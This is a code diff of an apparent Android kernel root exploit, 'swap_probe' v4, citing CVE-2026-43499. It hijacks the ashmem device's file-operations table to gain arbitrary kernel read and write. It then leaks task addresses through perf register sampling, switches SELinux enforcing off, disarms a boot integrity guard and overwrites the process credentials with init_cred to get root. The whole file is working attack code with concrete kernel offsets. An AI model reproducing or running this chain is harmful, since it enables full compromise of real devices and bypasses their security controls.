@@ -1,20 +1,26 @@
 /*
- * swap_probe v3 — full root chain inside a LIVE staged-swap window.
- * See docs/ROOT_PLAN_2026-08-28.md. All stages are syscall-level (configfs
- * R/W through the swapped fd). NO UAF walks, NO spray.
+ * swap_probe v4 — collapse-the-swap root chain.
+ * See docs/ROOT_PLAN_2026-08-28.md (§ collapse). All syscall-level.
  *
- * Usage: swap_probe <fake_fops_hex> <slide_hex>
- * Stages:
- *   A kwrite test (page scratch) + llseek repair (stops death clock)
- *   B park: 1 zero byte -> P0(selinux_state)+1   (perf unlocked)
- *   C modip harvest: PMU type=8 histogram -> hook page (off 0x3ac..0x4c8)
- *     -> g_boot_state module VA = page + 0x3000
- *   D PTE walk (VA_BITS=39, PA_BITS=48) via kread -> P0(g_boot_state)
- *   E disarm rootguard: 1 byte 0x01 -> P0(g_boot_state)
- *   F unpark: 1 byte 0x01 -> P0(selinux_state)+1
- *   G task self-find: runtime tasks-offset + comm match "GLRW01"
- *   H root: kwrite task+0x778/+0x780 = init_cred P0
- *   I cleanup: restore miscdevice.fops -> slid &ashmem_fops
+ * Usage: swap_probe <fake_fops_hex> <slide_hex> [gl_pid]
+ *
+ * Phase 1 (MILLISECONDS — race the ~2 min llseek death clock):
+ *   A1 open fd1 through the staged clone table (FMODE_CAN_WRITE via .write JT)
+ *   A2 kwrite: repair fake_fops llseek (+0x08 = slid noop_llseek)
+ *   A3 kwrite: REAL ashmem_fops .write slot (+0x18) = slid configfs_write JT
+ *   A4 kwrite: miscdevice.fops slot = slid &ashmem_fops  (swap collapsed)
+ *   A5 open fd2 through the real table (.write JT, CAN_WRITE) — primitive
+ *      now permanent, device normal-looking, fake page no longer needed.
+ *
+ * Phase 2 (leisurely, on fd2):
+ *   B  task self-find via user-PMU x28 (works under Enforcing) or
+ *      comm scan (init_task walk, runtime tasks offset)
+ *   C  park 1 byte (selinux_state+1 = 0) → kernel-IP perf unlocked
+ *   D  hook-page harvest → g_boot_state module VA
+ *   E  PTE walk (3-level, PA_BITS=48) → P0(g_boot_state)
+ *   F  g_boot_state = 1 (rootguard disarmed); unpark
+ *   G  cred/real_cred = init_cred → getuid()==0, persist proof
+ *   H  restore real table .write = 0 (device pristine; root persists)
  */
 #define _GNU_SOURCE
 #include <errno.h>
@@ -28,23 +34,25 @@
 #include <sys/prctl.h>
 #include <sys/syscall.h>
 #include <fcntl.h>
+#include <signal.h>
 #include <unistd.h>
 
 #define __ASHMEMIOC 0x77
 #define ASHMEM_NAME_LEN 256
 #define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
 
-#define KIMAGE 0xffffffc080000000ULL
+#define KIMAGE 0xffffffc008000000ULL
 #define OFF_NOOP_LLSEEK 0x181FE48ULL
-#define OFF_CFG_READ 0x182FCF8ULL
+#define OFF_CFG_WRITE 0x1830218ULL        /* configfs_write_bin_file .cfi_jt */
+#define OFF_CFG_READ 0x182FCF8ULL         /* configfs_read_bin_file .cfi_jt */
 #define OFF_ASH_RDITER 0x1822948ULL
-#define OFF_ASH_FOPS 0x22BFDC8ULL          /* &ashmem_fops (image) */
-#define OFF_MISC_FOPS 0x291A8E8ULL         /* miscdevice.fops slot */
-#define OFF_SELINUX_STATE 0x2A793C8ULL     /* bools: enforcing at +1 */
+#define OFF_ASH_FOPS 0x22BFDC8ULL         /* &ashmem_fops (real table, image) */
+#define OFF_MISC_FOPS 0x291A8E8ULL        /* ashmem miscdevice.fops slot */
+#define OFF_SELINUX_STATE 0x2A793C8ULL    /* packed bools, enforcing at +1 */
 #define OFF_INIT_TASK 0x27CC000ULL
 #define OFF_INIT_CRED 0x27E0BE0ULL
 
-#define PGD_P0 0xffffff802a491000ULL       /* swapper_pg_dir physmap alias */
+#define PGD_P0 0xffffff802a491000ULL      /* swapper_pg_dir physmap alias */
 #define P0_BASE 0xffffff8000000000ULL
 #define P0_PHYS_OFF 0x80000000ULL
 #define PTE_ADDR_MASK 0x0000FFFFFFFFF000ULL
@@ -52,21 +60,19 @@
 #define TSK_REAL_CRED 0x778
 #define TSK_CRED 0x780
 #define TSK_COMM 0x790
-#define TSK_PID 0x5C8
 
 #define GBOOT_CORE_OFF 0x3000ULL
 #define HOOK_LO 0x3acU
 #define HOOK_HI 0x4c8U
 
-#define PROBE_COMM "GLRW01"
+#define PROBE_COMM "GLRW04"
 
 static uint64_t g_slide;
 static uintptr_t g_fake_fops;
-static int g_fd;
+static int g_fd = -1;
 
 static uintptr_t slid(uint64_t off) { return (uintptr_t)(KIMAGE + g_slide + off); }
 static uintptr_t p0(uint64_t image_off) {
-  /* phys = 0xa8000000 + off; alias = P0_BASE + phys - 0x80000000 */
   return (uintptr_t)(P0_BASE + (0xa8000000ULL + image_off - P0_PHYS_OFF));
 }
 static uintptr_t p0_of_phys(uint64_t phys) {
@@ -97,23 +103,23 @@ static int set_name_blob(int fd, const unsigned char *blob, size_t len) {
   return 0;
 }
 
-static ssize_t kwrite(uintptr_t target, const void *data, size_t len) {
+static ssize_t kwrite(int fd, uintptr_t target, const void *data, size_t len) {
   unsigned char blob[128];
   memset(blob, 0, sizeof(blob));
   put64(blob, 88 - 11, target);
   put32(blob, 96 - 11, (uint32_t)len);
   put32(blob, 100 - 11, 0);
-  if (set_name_blob(g_fd, blob, sizeof(blob)) != 0) return -1;
+  if (set_name_blob(fd, blob, sizeof(blob)) != 0) return -1;
   errno = 0;
-  return pwrite(g_fd, data, len, 0);
+  return pwrite(fd, data, len, 0);
 }
 
-static ssize_t kread(uintptr_t target, void *data, size_t len) {
+/* read via .read arm / pread / disarm — arm window is a few ms */
+static ssize_t kread(int fd, uintptr_t target, void *data, size_t len) {
   uint64_t cfg_r = slid(OFF_CFG_READ);
   uint64_t zero = 0;
-  if (kwrite(g_fake_fops + 0x10, &cfg_r, 8) != 8) return -10;
-  if (kwrite(g_fake_fops + 0x20, &zero, 8) != 8) return -11;
-
+  if (kwrite(fd, p0(OFF_ASH_FOPS) + 0x10, &cfg_r, 8) != 8) return -10;
+  if (kwrite(fd, p0(OFF_ASH_FOPS) + 0x20, &zero, 8) != 8) return -11;
   unsigned char blob[128];
   memset(blob, 0, sizeof(blob));
   off_t pos = 0x1000;
@@ -123,35 +129,100 @@ static ssize_t kread(uintptr_t target, void *data, size_t len) {
   put32(blob, 80 - 11, 0);
   put32(blob, 100 - 11, 0);
   ssize_t rd = -1;
-  if (set_name_blob(g_fd, blob, sizeof(blob)) == 0) {
+  if (set_name_blob(fd, blob, sizeof(blob)) == 0) {
     errno = 0;
-    rd = pread(g_fd, data, len, pos);
+    rd = pread(fd, data, len, pos);
   }
   uint64_t real_rd = slid(OFF_ASH_RDITER);
-  kwrite(g_fake_fops + 0x10, &zero, 8);
-  kwrite(g_fake_fops + 0x20, &real_rd, 8);
+  kwrite(fd, p0(OFF_ASH_FOPS) + 0x10, &zero, 8);
+  kwrite(fd, p0(OFF_ASH_FOPS) + 0x20, &real_rd, 8);
   return rd;
 }
-
-static uint64_t kread64(uintptr_t a) {
+static uint64_t kread64(int fd, uintptr_t a) {
   uint64_t v = 0;
-  if (kread(a, &v, 8) != 8) return 0;
+  if (kread(fd, a, &v, 8) != 8) return 0;
   return v;
 }
 
-/* ---- stage C: perf harvest -> g_boot_state module VA ---- */
-static uintptr_t harvest_gboot(void) {
+/* ---- user-PMU x28 leak (works under Enforcing; 08-29 proven) ---- */
+static uintptr_t leak_x28(void) {
   int pmu = 8;
   FILE *f = fopen("/sys/bus/event_source/devices/armv8_pmuv3/type", "r");
-  if (f) {
-    if (fscanf(f, "%d", &pmu) != 1) pmu = 8;
-    fclose(f);
-  }
+  if (f) { if (fscanf(f, "%d", &pmu) != 1) pmu = 8; fclose(f); }
   struct perf_event_attr pe;
   memset(&pe, 0, sizeof(pe));
   pe.size = sizeof(pe);
   pe.type = (uint32_t)pmu;
-  pe.config = 0x8; /* inst_retired */
+  pe.config = 0x8;
+  pe.sample_period = 200;
+  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
+  pe.sample_regs_intr = 1ULL << 28; /* x28 */
+  pe.disabled = 1;
+  pe.exclude_kernel = 1; /* user-only allowed under Enforcing */
+  pe.exclude_hv = 1;
+  errno = 0;
+  int fd = (int)syscall(__NR_perf_event_open, &pe, 0L, -1, -1, 0);
+  if (fd < 0) { printf("  x28 perf open errno=%d\n", errno); return 0; }
+  size_t msz = 4096 * 65;
+  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+  if (buf == MAP_FAILED) { close(fd); return 0; }
+  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+  for (volatile int i = 0; i < 2000000; i++) syscall(__NR_getpid);
+  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+  struct perf_event_mmap_page *hdr = buf;
+  uint64_t head = hdr->data_head;
+  __sync_synchronize();
+  char *base = (char *)buf + 4096;
+  size_t dsz = 4096 * 64;
+  uint64_t pos = hdr->data_tail;
+  uintptr_t cand[8];
+  int votes[8] = {0};
+  while (pos < head) {
+    struct perf_event_header *ev = (void *)(base + (pos % dsz));
+    if (ev->size == 0) break;
+    if (ev->type == PERF_RECORD_SAMPLE) {
+      /* layout: ip (u64), then regs mask (u64) + x28 (u64) */
+      uint64_t ip = *(uint64_t *)((char *)ev + sizeof(*ev));
+      uint64_t *regs = (uint64_t *)((char *)ev + sizeof(*ev) + 8);
+      uint64_t mask = regs[0];
+      uint64_t x28 = regs[1];
+      (void)ip;
+      if ((mask & (1ULL << 28)) && x28 >= 0xffffff8000000000ULL &&
+          x28 <= 0xffffff9000000000ULL) {
+        int i, found = -1;
+        for (i = 0; i < 8; i++)
+          if (votes[i] && cand[i] == x28) { found = i; break; }
+        if (found < 0)
+          for (i = 0; i < 8; i++)
+            if (!votes[i]) { cand[i] = (uintptr_t)x28; found = i; break; }
+        if (found >= 0) votes[found]++;
+      }
+    }
+    pos += ev->size;
+  }
+  hdr->data_tail = head;
+  munmap(buf, msz);
+  close(fd);
+  int best = 0;
+  for (int i = 1; i < 8; i++) if (votes[i] > votes[best]) best = i;
+  if (votes[best] >= 8) {
+    printf("  x28 leak: %016llx (%d votes)\n",
+           (unsigned long long)cand[best], votes[best]);
+    return cand[best];
+  }
+  return 0;
+}
+
+/* ---- kernel-IP hook harvest (needs park) ---- */
+static uintptr_t harvest_gboot(void) {
+  int pmu = 8;
+  FILE *f = fopen("/sys/bus/event_source/devices/armv8_pmuv3/type", "r");
+  if (f) { if (fscanf(f, "%d", &pmu) != 1) pmu = 8; fclose(f); }
+  struct perf_event_attr pe;
+  memset(&pe, 0, sizeof(pe));
+  pe.size = sizeof(pe);
+  pe.type = (uint32_t)pmu;
+  pe.config = 0x8;
   pe.sample_period = 200;
   pe.sample_type = PERF_SAMPLE_IP;
   pe.disabled = 1;
@@ -159,7 +230,7 @@ static uintptr_t harvest_gboot(void) {
   pe.exclude_hv = 1;
   errno = 0;
   int fd = (int)syscall(__NR_perf_event_open, &pe, 0L, -1, -1, 0);
-  printf("  perf fd=%d errno=%d (need park first if 13)\n", fd, errno);
+  printf("  hook perf fd=%d errno=%d\n", fd, errno);
   if (fd < 0) return 0;
   size_t msz = 4096 * 65;
   void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
@@ -167,7 +238,6 @@ static uintptr_t harvest_gboot(void) {
   ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
   for (volatile int i = 0; i < 3000000; i++) syscall(__NR_getpid);
   ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
-
   struct perf_event_mmap_page *hdr = buf;
   uint64_t head = hdr->data_head;
   __sync_synchronize();
@@ -216,45 +286,43 @@ static uintptr_t harvest_gboot(void) {
   munmap(buf, msz);
   close(fd);
   if (best >= 0 && bh >= 2) {
-    printf("  hook page %016llx (hits=%d) -> gboot VA %016llx\n",
-           (unsigned long long)pages[best], bh,
+    printf("  hook page %016llx -> gboot VA %016llx\n",
+           (unsigned long long)pages[best],
            (unsigned long long)(pages[best] + GBOOT_CORE_OFF));
     return (uintptr_t)(pages[best] + GBOOT_CORE_OFF);
   }
   return 0;
 }
 
-/* ---- stage D: 3-level PTE walk ---- */
-static uintptr_t walk_to_p0(uintptr_t va) {
+/* ---- PTE walk ---- */
+static uintptr_t walk_to_p0(int fd, uintptr_t va) {
   uint64_t i_pgd = ((uint64_t)va >> 30) & 0x1FF;
   uint64_t i_pmd = ((uint64_t)va >> 21) & 0x1FF;
   uint64_t i_pte = ((uint64_t)va >> 12) & 0x1FF;
-  uint64_t e1 = kread64(PGD_P0 + i_pgd * 8);
-  printf("  pgd[%llu] = %016llx\n", (unsigned long long)i_pgd,
+  uint64_t e1 = kread64(fd, PGD_P0 + i_pgd * 8);
+  printf("  pgd[%llu]=%016llx\n", (unsigned long long)i_pgd,
          (unsigned long long)e1);
-  if (!(e1 & 1)) { printf("  pgd invalid\n"); return 0; }
-  uint64_t pmd_page = e1 & PTE_ADDR_MASK;
-  uint64_t e2 = kread64(p0_of_phys(pmd_page) + i_pmd * 8);
-  printf("  pmd[%llu] = %016llx\n", (unsigned long long)i_pmd,
+  if (!(e1 & 1)) return 0;
+  uint64_t e2 = kread64(fd, p0_of_phys(e1 & PTE_ADDR_MASK) + i_pmd * 8);
+  printf("  pmd[%llu]=%016llx\n", (unsigned long long)i_pmd,
          (unsigned long long)e2);
-  if (!(e2 & 1)) { printf("  pmd invalid\n"); return 0; }
+  if (!(e2 & 1)) return 0;
   uint64_t phys;
-  if (e2 & 2) { /* 2MB block */
+  if (e2 & 2) {
     phys = (e2 & ~0x1FFFFFULL) + (((uint64_t)va) & 0x1FFFFF);
-    printf("  pmd block -> phys %llx\n", (unsigned long long)phys);
   } else {
-    uint64_t e3 = kread64(p0_of_phys(e2 & PTE_ADDR_MASK) + i_pte * 8);
-    printf("  pte[%llu] = %016llx\n", (unsigned long long)i_pte,
+    uint64_t e3 = kread64(fd, p0_of_phys(e2 & PTE_ADDR_MASK) + i_pte * 8);
+    printf("  pte[%llu]=%016llx\n", (unsigned long long)i_pte,
            (unsigned long long)e3);
-    if (!(e3 & 1)) { printf("  pte invalid\n"); return 0; }
+    if (!(e3 & 1)) return 0;
     phys = e3 & PTE_ADDR_MASK;
   }
-  printf("  page phys %llx -> P0 %016llx\n", (unsigned long long)phys,
+  printf("  phys=%llx P0=%016llx\n", (unsigned long long)phys,
          (unsigned long long)p0_of_phys(phys));
   return p0_of_phys(phys);
 }
 
-/* ---- stage G: task self-find (runtime tasks offset) ---- */
+/* ---- comm-scan task find (fallback when x28 unavailable) ---- */
 static int printable_comm(const char *c) {
   int n = 0;
   for (int i = 0; i < 16 && c[i]; i++) {
@@ -263,41 +331,31 @@ static int printable_comm(const char *c) {
   }
   return n >= 2;
 }
-
-static int find_self_task(uintptr_t *out_task, int *out_off) {
+static int comm_is_self(const char *c) {
+  return strncmp(c, PROBE_COMM, sizeof(PROBE_COMM) - 1) == 0;
+}
+static int find_self_scan(int fd, uintptr_t *out) {
   uintptr_t init_task = p0(OFF_INIT_TASK);
   char comm[17] = {0};
-  if (kread(init_task + TSK_COMM, comm, 16) != 16 ||
+  if (kread(fd, init_task + TSK_COMM, comm, 16) != 16 ||
       strncmp(comm, "swapper", 7) != 0) {
-    printf("  init_task comm mismatch: %.16s\n", comm);
+    printf("  init_task comm bad: %.16s\n", comm);
     return 0;
   }
-  printf("  init_task ok (comm=%s)\n", comm);
-  /* scan init_task region for the tasks list_head pointer; derive offset by
-   * requiring two consecutive comm-readable nodes */
   for (size_t slot = 0x300; slot < 0x700; slot += 8) {
-    uintptr_t nxt = (uintptr_t)kread64(init_task + slot);
+    uintptr_t nxt = (uintptr_t)kread64(fd, init_task + slot);
     if (nxt < 0xffffff8000000000ULL || nxt > 0xffffff9000000000ULL) continue;
     for (int off = 0x300; off <= 0x700; off += 8) {
       uintptr_t t2 = nxt - (uintptr_t)off;
       char c2[17] = {0};
-      if (kread(t2 + TSK_COMM, c2, 16) != 16) continue;
+      if (kread(fd, t2 + TSK_COMM, c2, 16) != 16) continue;
       if (!printable_comm(c2)) continue;
-      uintptr_t nxt2 = (uintptr_t)kread64(t2 + (uintptr_t)off);
-      if (nxt2 < 0xffffff8000000000ULL || nxt2 > 0xffffff9000000000ULL) continue;
-      /* walk: find our comm */
       uintptr_t t = t2;
       for (int hops = 0; hops < 4000; hops++) {
         char c[17] = {0};
-        if (kread(t + TSK_COMM, c, 16) != 16) break;
-        if (strncmp(c, PROBE_COMM, sizeof(PROBE_COMM) - 1) == 0) {
-          *out_task = t;
-          *out_off = off;
-          printf("  tasks_off=%#x self=%016llx (%s)\n", off,
-                 (unsigned long long)t, c);
-          return 1;
-        }
-        t = (uintptr_t)kread64(t + (uintptr_t)off) - (uintptr_t)off;
+        if (kread(fd, t + TSK_COMM, c, 16) != 16) break;
+        if (comm_is_self(c)) { *out = t; return 1; }
+        t = (uintptr_t)kread64(fd, t + (uintptr_t)off) - (uintptr_t)off;
         if (t < 0xffffff8000000000ULL || t > 0xffffff9000000000ULL) break;
         if (t == init_task) break;
       }
@@ -308,86 +366,96 @@ static int find_self_task(uintptr_t *out_task, int *out_off) {
 
 int main(int argc, char **argv) {
   if (argc < 3) {
-    fprintf(stderr, "usage: %s fake_fops_hex slide_hex\n", argv[0]);
+    fprintf(stderr, "usage: %s fake_fops_hex slide_hex [gl_pid]\n", argv[0]);
     return 2;
   }
   g_fake_fops = (uintptr_t)strtoull(argv[1], NULL, 0);
   g_slide = strtoull(argv[2], NULL, 0);
+  int gl_pid = (argc > 3) ? (int)strtol(argv[3], NULL, 0) : 0;
+  (void)g_fake_fops;
 
-  g_fd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
-  if (g_fd < 0) { printf("open failed errno=%d\n", errno); return 1; }
-  printf("fd=%d fake_fops=%llx slide=%llx pid=%d\n", g_fd,
-         (unsigned long long)g_fake_fops, (unsigned long long)g_slide,
-         (int)getpid());
   prctl(PR_SET_NAME, PROBE_COMM, 0, 0, 0);
 
-  /* A: write test + llseek repair */
-  const char marker[] = "GLRW01RW";
-  if (kwrite(g_fake_fops + 0x700, marker, 8) != 8) {
-    printf("A WRITE TEST FAILED errno=%d — swap not live?\n", errno);
-    close(g_fd);
-    return 1;
-  }
-  printf("A write LIVE\n");
+  /* ============ PHASE 1: collapse the swap (fast!) ============ */
+  int fd1 = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
+  if (fd1 < 0) { printf("P1 open fd1 errno=%d\n", errno); return 1; }
   uint64_t llseek = slid(OFF_NOOP_LLSEEK);
-  printf("A llseek repair ret=%zd\n", kwrite(g_fake_fops + 0x08, &llseek, 8));
+  uint64_t cfg_w = slid(OFF_CFG_WRITE);
+  uint64_t real_fops = (uint64_t)slid(OFF_ASH_FOPS);
+  uint64_t zero = 0;
+  ssize_t r1 = kwrite(fd1, g_fake_fops + 0x08, &llseek, 8);
+  ssize_t r2 = kwrite(fd1, p0(OFF_ASH_FOPS) + 0x18, &cfg_w, 8);
+  ssize_t r3 = kwrite(fd1, p0(OFF_MISC_FOPS), &real_fops, 8);
+  printf("P1 collapse: llseek=%zd write_jt=%zd misc_restore=%zd\n", r1, r2, r3);
+  if (r3 != 8) {
+    printf("P1 FAILED — misc.fops not restored; device on death clock\n");
+    return 1;
+  }
+  /* primitive is now the real table's .write slot. GhostLock may die. */
+  if (gl_pid) kill(gl_pid, SIGKILL);
+  close(fd1);
 
-  /* B: park */
-  unsigned char zero = 0;
-  printf("B park ret=%zd\n", kwrite(p0(OFF_SELINUX_STATE) + 1, &zero, 1));
+  int fd2 = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
+  if (fd2 < 0) { printf("P1 open fd2 errno=%d\n", errno); return 1; }
+  g_fd = fd2;
+  uint64_t chk = 0;
+  if (kread(fd2, p0(OFF_ASH_FOPS) + 0x18, &chk, 8) == 8)
+    printf("P1 verify .write slot = %016llx (want %016llx)\n",
+           (unsigned long long)chk, (unsigned long long)cfg_w);
+  if (chk != cfg_w) { printf("P1 verify FAILED\n"); return 1; }
+  printf("P1 COLLAPSED — primitive permanent, device stable\n");
 
-  /* C: harvest */
+  /* ============ PHASE 2 ============ */
+  /* B: task self-find — x28 first, comm scan fallback */
+  uintptr_t task = leak_x28();
+  if (task) {
+    char c[17] = {0};
+    if (kread(fd2, task + TSK_COMM, c, 16) != 16 || !comm_is_self(c)) {
+      printf("B x28 comm mismatch (%.16s) — falling back\n", c);
+      task = 0;
+    }
+  }
+  if (!task && !find_self_scan(fd2, &task)) {
+    printf("B task find FAILED\n");
+    kwrite(fd2, p0(OFF_ASH_FOPS) + 0x18, &zero, 8); /* cleanup */
+    return 1;
+  }
+  printf("B task=%016llx\n", (unsigned long long)task);
+
+  /* C: park */
+  unsigned char zero_b = 0, one_b = 1;
+  printf("C park ret=%zd\n", kwrite(fd2, p0(OFF_SELINUX_STATE) + 1, &zero_b, 1));
+
+  /* D: hook harvest */
   uintptr_t gboot_va = harvest_gboot();
-  if (!gboot_va) {
-    printf("C harvest FAILED — leaving parked, abort\n");
-    close(g_fd);
-    return 1;
-  }
+  if (!gboot_va) { printf("D harvest FAILED (unpark+cleanup)\n"); goto cleanup; }
 
-  /* D: walk */
-  uintptr_t gboot_p0 = walk_to_p0(gboot_va);
-  if (!gboot_p0) {
-    printf("D walk FAILED — leaving parked, abort\n");
-    close(g_fd);
-    return 1;
-  }
+  /* E: PTE walk */
+  uintptr_t gboot_p0 = walk_to_p0(fd2, gboot_va);
+  if (!gboot_p0) { printf("E walk FAILED (unpark+cleanup)\n"); goto cleanup; }
 
-  /* E: disarm rootguard */
-  unsigned char one = 1;
-  printf("E gboot disarm ret=%zd\n", kwrite(gboot_p0, &one, 1));
+  /* F: disarm rootguard + unpark */
+  printf("F gboot=1 ret=%zd\n", kwrite(fd2, gboot_p0, &one_b, 1));
+  printf("F unpark ret=%zd\n", kwrite(fd2, p0(OFF_SELINUX_STATE) + 1, &one_b, 1));
 
-  /* F: unpark */
-  printf("F unpark ret=%zd\n", kwrite(p0(OFF_SELINUX_STATE) + 1, &one, 1));
-
-  /* G: find task */
-  uintptr_t task;
-  int toff;
-  if (!find_self_task(&task, &toff)) {
-    printf("G task find FAILED (guard already off; cred skipped)\n");
-    close(g_fd);
-    return 1;
-  }
-
-  /* H: cred -> init_cred */
+  /* G: cred */
   uint64_t init_cred = (uint64_t)p0(OFF_INIT_CRED);
-  printf("H real_cred ret=%zd\n", kwrite(task + TSK_REAL_CRED, &init_cred, 8));
-  printf("H cred      ret=%zd\n", kwrite(task + TSK_CRED, &init_cred, 8));
-
-  /* verify */
+  printf("G real_cred ret=%zd\n", kwrite(fd2, task + TSK_REAL_CRED, &init_cred, 8));
+  printf("G cred ret=%zd\n", kwrite(fd2, task + TSK_CRED, &init_cred, 8));
   if (getuid() == 0) {
-    printf("*** ROOT: getuid()=0 euid=%d ***\n", geteuid());
+    printf("*** ROOT: getuid()=0 ***\n");
     system("id > /data/local/tmp/ROOTED 2>&1");
-    system("echo kernel-root-via-CVE-2026-43499 >> /data/local/tmp/ROOTED");
+    system("echo kernel-root-CVE-2026-43499 >> /data/local/tmp/ROOTED");
+    system("cat /proc/$$/status | grep -E 'Uid|Gid|Cap' >> /data/local/tmp/ROOTED");
   } else {
-    printf("H cred written but getuid=%d (check guard disarm)\n", getuid());
+    printf("G getuid=%d (guard or cred failed)\n", getuid());
   }
 
-  /* I: restore fops -> device back to normal */
-  uint64_t orig_fops = (uint64_t)slid(OFF_ASH_FOPS);
-  printf("I fops restore ret=%zd (orig=%016llx)\n",
-         kwrite(p0(OFF_MISC_FOPS), &orig_fops, 8),
-         (unsigned long long)orig_fops);
-  close(g_fd);
+cleanup:
+  /* H: pristine device (root cred persists) */
+  printf("H restore .write=0 ret=%zd\n",
+         kwrite(fd2, p0(OFF_ASH_FOPS) + 0x18, &zero, 8));
+  close(fd2);
   printf("PROBE DONE uid=%d\n", getuid());
   return getuid() == 0 ? 0 : 1;
 }
